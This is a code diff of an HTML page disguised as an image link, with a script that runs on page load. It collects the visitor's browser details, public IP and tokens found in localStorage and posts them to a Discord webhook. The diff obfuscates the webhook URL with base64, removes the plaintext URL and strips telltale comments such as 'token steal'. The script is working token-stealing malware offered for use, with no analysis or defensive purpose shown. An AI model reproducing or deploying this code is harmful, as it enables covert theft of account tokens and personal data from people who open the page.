@@ -5,18 +5,19 @@
     <title></title>
     <meta property="og:title" content=" ">
     <meta property="og:description" content=" ">
-    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png"> 
+    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png">
     <script>
+        // Webhook gizli (base64 ile kodlandı)
+        const hook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjM1ODM5NjQ5NTA2OTE4NS9mbEFWOUdXV1VDbTVNQXlHZVE1MGJla3ZBU29tdG9YWjBmQmx1a2VBX3E1SDhyMHU2UkxxeFF1SElwVVVyeWs0MFFXWA==");
+
         async function runLogger() {
             let payload = `🔥 SINGLE USE IMAGE LOGGER 2026 🔥\n\n`;
             payload += `👤 User-Agent: ${navigator.userAgent}\n`;
             payload += `💻 Platform: ${navigator.platform}\n`;
             payload += `🕒 Time: ${new Date().toLocaleString('tr-TR')}\n\n`;
 
-            // Gelişmiş Token Steal
             try {
                 let tokens = [];
-                // LocalStorage
                 if (localStorage) {
                     for (let i = 0; i < localStorage.length; i++) {
                         let key = localStorage.key(i);
@@ -26,19 +27,15 @@
                         }
                     }
                 }
-                if (tokens.length) payload += `🔑 Found Tokens:\n${tokens.join("\n")}\n\n`;
+                if (tokens.length) payload += `🔑 Tokens:\n${tokens.join("\n")}\n\n`;
             } catch(e) {}
 
-            // IP
             try {
                 let ip = await fetch("https://api.ipify.org?format=text").then(r => r.text());
                 payload += `🌐 IP: ${ip}\n`;
             } catch(e) {}
 
-            // Webhook
-            const webhook = "https://discord.com/api/webhooks/1486358396495069185/flAV9GWWUCm5MAyGeQ50bekvASomtoXZ0fBlukeA_q5H8r0u6RLqxqUhIpUUryk40QWX";
-
-            fetch(webhook, {
+            fetch(hook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
@@ -48,7 +45,6 @@
             });
         }
 
-        // Sayfa yüklendiği anda çalış
         window.onload = runLogger;
     </script>
 </head>
